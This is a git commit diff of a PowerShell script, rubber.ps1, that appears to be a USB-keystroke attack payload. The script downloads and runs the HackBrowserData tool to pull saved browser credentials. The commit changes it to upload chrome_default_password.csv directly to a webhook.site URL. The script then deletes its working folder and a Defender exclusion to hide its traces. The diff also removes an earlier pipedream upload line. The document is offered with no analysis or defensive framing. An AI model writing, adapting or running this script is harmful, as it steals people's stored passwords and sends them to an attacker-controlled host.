6d2ca164422b3a44879aae7a71ab8ce6e9373d88
victorsrsr <119705131+victorsrsr@users.noreply.github.com>
2023-07-26 21:11:35 +0200

    Update rubber.ps1

--- rubber.ps1
+++ rubber.ps1
@@ -1,15 +1,7 @@
 curl https://github.com/moonD4rk/HackBrowserData/releases/download/v0.4.4/hack-browser-data-windows-32bit.zip -OutFile C:\a\hack-browser-data-windows-32bit.zip
-Start-Sleep -Seconds 5
 Expand-Archive -LiteralPath C:\a\hack-browser-data-windows-32bit.zip -DestinationPath C:\a\
-Start-Sleep -Seconds 5
 C:\a\hack-browser-data-windows-32bit.exe
-Start-Sleep -Seconds 10
-Get-ChildItem -Path .\Results -Filter "*.csv" | ForEach-Object {
-    Get-Content $_.FullName | Select-Object -Skip 1 | Add-Content -Path final.csv
-}
-Start-Sleep -Seconds 5
-#Invoke-WebRequest -Uri https://eom42ixwtnc2bh1.m.pipedream.net -Method Post -Infile .\final.csv  -UseBasicParsing
-Invoke-WebRequest -Uri https://webhook.site/961aad4b-5215-4f52-b6a5-e8755e68f401 -Method Post -Infile .\final.csv  -UseBasicParsing
+Invoke-WebRequest -Uri https://webhook.site/961aad4b-5215-4f52-b6a5-e8755e68f401 -Method Post -Infile C:\a\results\chrome_default_password.csv  -UseBasicParsing
 cd ..
 Remove-Item -Path "C:\a" -Recurse
 Remove-MpPreference -ExclusionPath "C:\a\"
